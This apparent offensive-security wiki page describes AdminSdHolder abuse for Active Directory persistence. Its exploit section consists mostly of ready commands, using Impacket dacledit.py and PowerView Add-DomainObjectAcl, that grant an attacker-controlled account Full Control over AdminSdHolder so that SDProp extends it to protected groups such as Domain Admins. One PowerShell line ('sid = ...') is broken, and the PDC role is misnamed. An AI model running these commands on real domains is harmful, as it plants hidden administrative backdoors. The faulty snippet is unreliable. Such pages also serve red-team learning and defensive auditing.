## Theory
AdminSdHolder protects domain objects against permission changes. "AdminSdHolder" either refers to a domain object, a "worker code" or an operation depending on the context.

The operation consists in the PDC (Principal Domain Controller) Emulator restoring pre-set permissions for high-privilege users every 60 minutes.

The AdminSdHolder object is located at `CN=AdminSdHolder,CN=SYSTEM,DC=DOMAIN,DC=LOCAL`.

## Exploit
Once sufficient privileges are obtained, attackers can abuse AdminSdHolder to get persistence on the domain by modifying the AdminSdHolder object's DACL.

Let's say an attacker adds the following ACE to AdminSdHolder's DACL: `attackercontrolleduser: Full Control.`

At the next run of `SDProp`, `attackercontrolleduser` will have a `GenericAll` privilege over all protected objects (Domain Admins, Account Operators, and so on).
=== "UNIX-like"
    From UNIX-like systems, this can be done with Impacket's dacledit.py (Python).
    ```bash
    dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
    ```
    AdminSdHolder's DACL can then be inspected with the same utility.
    ```bash
    dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' 'domain'/'user':'password'
    ```
=== "Windows"
    This can be done in PowerShell with `Add-DomainObjectAcl` from PowerSploit's PowerView module.
    ```bash
    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
    ```
    AdminSdHolder's DACL can then be inspected with `Get-DomainObjectAcl`.
    ```bash
    # Inspect all AdminSdHolder's DACL
    Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs

    # Inspect specific rights an object has on AdminSdHolder (example with a user)
    sid = Get-DomainUser "someuser" | Select-Object -ExpandProperty objectsid
    Get-DomainObjectAcl -SamAccountName "AdminSdHolder" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $sid}
    ```